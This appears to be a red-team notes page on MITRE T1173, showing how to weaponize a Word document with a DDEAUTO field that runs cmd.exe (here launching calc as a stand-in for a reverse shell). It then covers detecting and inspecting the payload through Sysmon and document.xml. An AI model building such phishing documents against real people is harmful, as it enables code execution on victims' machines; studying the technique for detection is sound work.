---
description: Dynamic Data Exchange code - executing code in Microsoft Office documents.
---

# T1173: Phishing - DDE

### Weaponization

Open a new MS Word Document and insert a field:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOE_i0b6v23TEMANbO%2F-LHONn4sUHx2Suv5E266%2Fdde-insert-field.png?alt=media\&token=07e0d180-6742-4dcd-b6d5-b5deb50b8534)

It will add an `!Unexpected End of Formula`to the document, that is expected. Right click it > Toggle Field Codes:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOE_i0b6v23TEMANbO%2F-LHOO4Xm5CphWj5z09pB%2Fdde-toggle-code.png?alt=media\&token=d3623a52-0672-4531-b402-df813dfb8d20)

Toggle Field Codes will give this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOOqJmxHEvvd2s7Kwm%2F-LHOPdXAsp4R8fqhGvz0%2Fdde-merge.png?alt=media\&token=397886e7-ad70-41cf-bdc6-1c7d904075a0)

Replace `= \* MERGEFORMAT` with payload and save the doc:

```bash
DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" 
```

to get this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOQ4nQxNAkq2fbDqrg%2F-LHOQ2-XyUnyZxzuue6a%2Fdde-payload.png?alt=media\&token=98ce5478-a810-483c-87bc-e7dbc1f9a67e)

### Execution

Once the victim launches the evil .docx by and accepts 2 prompts, the reverse shell (or in this case a calc.exe) pops:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOQ4nQxNAkq2fbDqrg%2F-LHOQGWzxYlJXcO59-2m%2Fdde-prompt1.png?alt=media\&token=eb3fcc72-8b5a-4139-a2c6-a754f06f62fe)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOQ4nQxNAkq2fbDqrg%2F-LHOQLd4T-8u52iy4yME%2Fdde-prompt2.png?alt=media\&token=6f98e157-def8-4b30-82ec-e89de7007fa8)

### Observations

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOQXg2G8n_pXupNelj%2F-LHOQ_KHcZpwsFfQuVOj%2Fdde-procexp.png?alt=media\&token=a0f6d8ee-1960-4131-be69-a60e3c1aa69d)

Sysmon logs can help spot suspicious processes and/or network connections being initiated by Office applications:

![3rd and 4th columns respectively: PID and PPID](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHOT8yeX-5_Re-GBtR5%2F-LHOT6Wce0wc24FsMBRb%2Fdde-sysmon.png?alt=media\&token=54253be4-71bf-4c48-9639-8bb64569dead)

### Inspection

How can we inspect .docx (same for .xlsx) files? Since they are essentially .zip archives, we can rename the .docx file to .zip and simply unzip the archive for further inspection.

The file we are interested in is the `document.xml` (trimmed for brevity below). Note how line 4 allows us inspecting the DDE payload in plain text:

{% code title="document.xml" %}
```markup
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se wp14">
<...snip...>
      <w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText>
<...snip...>
</w:document>
```
{% endcode %}

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1173" %}
